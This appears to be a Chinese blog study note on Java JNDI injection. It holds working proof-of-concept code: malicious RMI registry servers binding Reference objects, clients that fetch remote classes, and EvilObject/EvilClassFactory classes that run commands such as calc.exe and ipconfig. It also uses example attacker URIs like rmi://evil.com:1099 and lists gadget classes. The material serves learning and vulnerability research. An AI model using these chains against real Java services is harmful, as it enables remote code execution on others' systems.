---
title: JNDI注入学习
date: 2023-03-19 20:57:39
tags: Java
cover: https://raw.githubusercontent.com/todis21/image/main/202303212056761.png
---

# JNDI注入学习

## 理解JNDI

JNDI是Java命名和目录接口，是Java的一个目录服务应用程序接口，它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象。--------维基百科

很官方，看不懂 建议看这篇文章理解    https://blog.csdn.net/wn084/article/details/80729230

通俗易懂的解释就是就是把资源取个名字，再根据名字来找资源,就像人的身份证或DNS中的域名与IP的关系

另一种理解：JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。

JNDI支持的服务主要有：`DNS`、`LDAP`、`CORBA`、`RMI`等

#### Java Naming

命名服务是一种键值对的绑定，使应用程序可以通过键检索值。

#### Java Directory

目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。

JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。

#### ObjectFactory

Object Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。

JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。





## JNDI代码示例

先写个用于测试的`Person`类

```java
import java.io.Serializable;
import java.rmi.Remote;

public class Person implements Remote, Serializable {
    private static final long serialVersionUID = 1L;
    private String name;
    private String password;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getPassword() {
        return password;
    }

    public void setPassword(String password) {
        this.password = password;
    }

    public String toString(){
        return "name:"+name+" password:"+password;
    }
}
```

这段代码实现了两个接口：Remote和Serializable。其中，Remote是Java远程方法调用（RMI）机制中的标记接口，用于表明该类的实例可以被远程访问；Serializable则是Java序列化机制中的标记接口，用于表明该类的实例可以被序列化成字节流并传输。

除了这两个接口之外，Person类还有两个私有属性：name和password，分别表示人名和密码。它们都提供了对应的getter和setter方法，用于获取和设置属性值。此外，还定义了一个toString()方法，用于将Person对象转换成字符串形式返回。





下面是服务端：

```
import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.registry.LocateRegistry;

public class Server {
    public static void initPerson() throws Exception {
        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常
        LocateRegistry.createRegistry(6666);
        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        System.setProperty(Context.PROVIDER_URL, "rmi://localhost:6666");

        //初始化
        InitialContext ctx = new InitialContext();

        //实例化person对象
        Person p = new Person();
        p.setName("T0dis");
        p.setPassword("helloworld!");

        //person对象绑定到JNDI服务中，JNDI的名字叫做：person。
        ctx.bind("person", p);
        ctx.close();
    }

    public static void main(String[] args) throws Exception {
        initPerson();
        System.out.println("Server is running and waiting for client to connect...");
        //加入阻塞代码，使Server一直运行
        Object lock = new Object();
        synchronized (lock) {
            lock.wait();
        }

    }
}
```

服务端的代码使用Java RMI实现了JNDI服务。实现过程如下：

1. 在initPerson()方法中，首先使用 `LocateRegistry.createRegistry` 方法创建了一个 RMI Registry 对象。这个对象被绑定到本地6666端口。RMI Registry 是一个注册表，它维护了所有注册到它的对象。在这个例子中，Person对象将被绑定到RMI Registry中。
2. 然后设置了JNDI的工厂和JNDI的url和端口参数。这些参数在创建InitialContext对象时会使用到。如果未设置这些参数，则无法连接到JNDI服务并将导致 NoInitialContextException 异常。
3. 创建 InitialContext 对象。这个对象将用作与JNDI服务通讯的主要入口。可以使用 `ctx.bind` 方法来将一个Person对象绑定到 JNDI服务中，这个对象的名字被指定为 "person"。
4. 创建了一个Person对象，并设置了它的属性（即名称和密码）。
5. 将Person对象绑定到JNDI服务中，以便客户端可以查询和使用它。









下面的是客户端的代码：

```
import javax.naming.Context;
import javax.naming.InitialContext;

public class Client {
    public static void main(String[] args)throws Exception {
        System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        System.setProperty(Context.PROVIDER_URL, "rmi://localhost:6666");
        InitialContext ctx = new InitialContext();

        //通过lookup查找person对象
        Person person = (Person) ctx.lookup("person");

        //打印出这个对象
        System.out.println(person.toString());
        ctx.close();
    }
}
```



1. 通过使用System.setProperty()方法，设置 JNDI 的工厂和目标端口，以便获取RMI对象。
2. 使用 InitialContext 类创建一个新的 JNDI 上下文并将其赋值给 ctx 对象。
3. 查找在服务端已经在RMI注册表上注册了的“person”对象，并将其赋值给person对象。
4. 输出 person 对象的 toString 方法的返回值。
5. 关闭ctx，释放与JNDI上下文的所有资源



## JNDI注入

要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。

- JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
- JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
- JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。





在上面的代码示例中客户端 `Person person = (Person) ctx.lookup("person");`，如果`lookup`函数的参数可控,就有可能会造成`JNDI注入`



官方一点的解释：JNDI 注入**就是控制 lookup 函数的参数，这样来使客户端访问恶意的 RMI 或者 LDAP 服务来加载恶意的对象，从而执行代码**，完成利用在 JNDI 服务中，通过绑定一个外部远程对象让客户端请求，从而使客户端恶意代码执行的方式就是利用 Reference 类实现的

大概过程：

![img](https://miro.medium.com/v2/resize:fit:560/1*JH6AblHnH7grDeyGMRHKZg.png)

① 攻击者为易受攻击的JNDI的lookup方法提供了LDAP/RMI URL

② 目标服务器连接到远端LDAP/RMI服务器，LDAP/RMI服务器返回恶意JNDI引用

③ 目标服务器解码JNDI引用

④ 从远端LDAP/RMI服务器获取Factory类

⑤ 目标服务器实例化Factory类

⑥ payload得到执行。



## Reference类

该类也是在`javax.naming`的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。

构造方法

```java
Reference(String className) 
	为类名为“className”的对象构造一个新的引用。  
Reference(String className, RefAddr addr) 
	为类名为“className”的对象和地址构造一个新引用。  
Reference(String className, RefAddr addr, String factory, String factoryLocation) 
	为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  
Reference(String className, String factory, String factoryLocation) 
	为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  
```



```
String url = "http://127.0.0.1:8080";
Reference reference = new Reference("test", "test", url);
```

参数1：`className` - 远程加载时所使用的类名

参数2：`classFactory` - 加载的`class`中需要实例化类的名称

参数3：`classFactoryLocation` - 提供`classes`数据的地址可以是`file/ftp/http`协议

## JNDI_RMI的攻击面

#### RMI+Reference利用



Reference类：

Reference类表示对存在于命名/目录系统以外的对象的引用。

Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。

在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。

几个比较关键的属性：

- className：远程加载时所使用的类名；
- classFactory：加载的class中需要实例化类的名称；
- classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议

**这个类中包含被引用对象的类信息和地址**。



因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。so，利用思路如下：

**将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行**



![img](https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/6.png)



1. 攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 `rmi://evil.com:1099/refObj`；
2. 原先配置好的上下文环境 `rmi://localhost:1099` 会因为动态环境转换而被指向 `rmi://evil.com:1099/`；
3. 应用去 `rmi://evil.com:1099` 请求绑定对象 `refObj`，攻击者事先准备好的 RMI 服务会返回与名称 `refObj`想绑定的 ReferenceWrapper 对象（`Reference("EvilObject", "EvilObject", "http://evil-cb.com/")`）；
4. 应用获取到 `ReferenceWrapper` 对象开始从本地 `CLASSPATH` 中搜索 `EvilObject` 类，如果不存在则会从 `http://evil-cb.com/` 上去尝试获取 `EvilObject.class`，即动态的去获取 `http://evil-cb.com/EvilObject.class`；
5. 攻击者事先准备好的服务返回编译好的包含恶意代码的 `EvilObject.class`；
6. 应用开始调用 `EvilObject` 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；



 **PS**: JNDI协议动态转换即在运行时动态地切换JNDI提供者的类型或实现。这种转换可以在应用程序的代码中发生，例如在代码中更改JNDI上下文的URL以使用不同的服务提供者。这样可以在不修改应用程序代码的情况下实现切换和更改JNDI提供者。类比于换手机卡，不同的卡可以提供不同的服务，可以根据需要更换卡来达到切换服务的目的

我的JDK版本是jdk1.8.0_361 





客户端代码：

```java
import javax.naming.Context;
import javax.naming.InitialContext;

public class Client {
    public static void main(String[] args)throws Exception {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");//允许RMI协议进行远程调，可能是JDK版本的问题,没有这个会报错
        String uri = "rmi://127.0.0.1:1099/refObj";
        Context ctx = new InitialContext();
        System.out.println("Using lookup() to fetch object with " + uri);
        ctx.lookup(uri);
    }

}

```

服务端：

```java
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.Reference;
import com.sun.jndi.rmi.registry.ReferenceWrapper;
public class Server {

    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'");
        registry.bind("refObj", refObjWrapper);
    }

}
```

恶意类(弹计算机)：

```java
public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"cmd", "/C", "calc.exe"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
```

为了防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生，将Server和Client放在同一个文件夹，EvilObject放在另外的文件夹



在复现过程中，发现EvilObject并没有被远程加载，只能加载当前路径编译好的字节代码

![image-20230320190331836](https://raw.githubusercontent.com/todis21/image/main/202303201903952.png)

查找原因：

- 在jdk < jdk8u121 之前才能通过reference 加载远程class 



#### lookup参数注入

当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行

这个的思路和上面的是一样的



下面的客户端代码，这里假设lookup()参数是可控的，rmi://127.0.0.1:1099/Foo是用户输入的，

```java
import javax.naming.InitialContext;
import javax.naming.NamingException;


public class Client {
    public static void main(String[] args) {
        try {
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
            Object ret = new InitialContext().lookup("rmi://127.0.0.1:1099/Foo");
            System.out.println("ret: " + ret);
        } catch (NamingException e) {
            e.printStackTrace();
        }
    }

}

```

下面是攻击者搭建的恶意RMI注册表服务：

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {

    public static void main(String args[]) {

        try {
            // 通过调用LocateRegistry类的createRegistry()方法并将默认端口号1099作为参数创建一个注册表
            Registry registry = LocateRegistry.createRegistry(1099);
            // 指定要执行的恶意对象的URL，并创建一个Reference类的新对象
            String factoryUrl = "http://localhost:1098/";
            Reference reference = new Reference("EvilObject","EvilObject", factoryUrl);

            // 用ReferenceWrapper类包装恶意引用
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);

            // 使用名称“Foo”将恶意对象绑定到注册表中
            registry.bind("Foo", wrapper);

            System.err.println("Server ready, factoryUrl:" + factoryUrl);
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }
    }
}
```



恶意类(弹计算机)：

```java
public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"cmd", "/C", "calc.exe"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
```





模拟场景，攻击者开启恶意RMI注册表服务Server，同时恶意类EvilObject放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向Server的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。**PS**:这些代码只适用于低版本的jdk,`JDK 6u132`、`7u122`、`8u113` 开始 `com.sun.jndi.rmi.object.trustURLCodebase` 默认值为`false`，运行时需加入参数 `-Dcom.sun.jndi.rmi.object.trustURLCodebase=true` 。因为如果 `JDK` 高于这些版本，默认是不信任远程代码的，因此也就无法加载远程 `RMI` 代码。

![image-20230321122926066](https://raw.githubusercontent.com/todis21/image/main/202303211229233.png)





在RMI中调用了InitialContext.lookup()的类有：

```
org.springframework.transaction.jta.JtaTransactionManager.readObject()
com.sun.rowset.JdbcRowSetImpl.execute()
javax.management.remote.rmi.RMIConnector.connect()
org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)
```



在LDAP中调用了InitialContext.lookup()的类有：

```
InitialDirContext.lookup()
Spring's LdapTemplate.lookup()
LdapTemplate.lookupContext()
```



#### classFactoryLocation参数注入

`lookup()`参数注入是针对RMI客户端的,	`classFactoryLocation`是针对RMI服务端的,也就是服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入

例如下面的：



客户端，lookup参数**不可控**

```java
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Properties;


public class Client {
    public static void main(String[] args) throws Exception {
        Properties env = new Properties();
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
        Context ctx = new InitialContext(env);
        System.out.println("[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo");
        ctx.lookup("demo");
    }

}

```



服务端, `url`**可控**

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {

    public static void main(String args[]) throws Exception {
        String uri = "http://127.0.0.1:8000";
//        if(args.length == 1) {
//            uri = args[0];
//        } else {
//            uri = "http://127.0.0.1/demo.class";
//        }
        System.out.println("[*]classFactoryLocation: " + uri);
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference refObj = new Reference("EvilClass", "EvilClassFactory", uri);
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
        System.out.println("[*]Binding 'demo' to 'rmi://192.168.43.201:1099/demo'");
        registry.bind("demo", refObjWrapper);
    }
}
```



恶意类：

```java
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Hashtable;
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;

public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory {
    public EvilClassFactory() throws RemoteException {
        super();
        InputStream inputStream;
        try {
        //执行命令，返回命令执行结果
            inputStream = Runtime.getRuntime().exec("ipconfig").getInputStream();
            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
            String linestr;
            while ((linestr = bufferedReader.readLine()) != null){
                System.out.println(linestr);
            }
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}
```

攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行



![image-20230321144627180](https://raw.githubusercontent.com/todis21/image/main/202303211446541.png)





#### 结合反序列漏洞

反序列化还没学,有机会补上。根据搜索得到的解释：这种情形其实就是**漏洞类重写的readObject()方法中直接或间接调用了可被外部控制的lookup()方法，导致攻击者可以通过JNDI注入来进行反序列化漏洞的利用**





## JNDI_LDAP的攻击面



#### LDAP+Reference利用

JNDI的SPI层除了RMI外，还可以跟LDAP交互。与RMI类似，LDAP也能同样返回一个Reference给JNDI的Naming Manager ，只是lookup()中的URL为一个LDAP地址如`ldap://xxx/xxx`，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。



注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，`com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被设置为`false`，对LDAP Reference远程工厂类的加载增加了限制。

所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。

![image-20210801143159130](https://raw.githubusercontent.com/todis21/image/main/202303221520356.png)









## 》》》》》玩命加载中

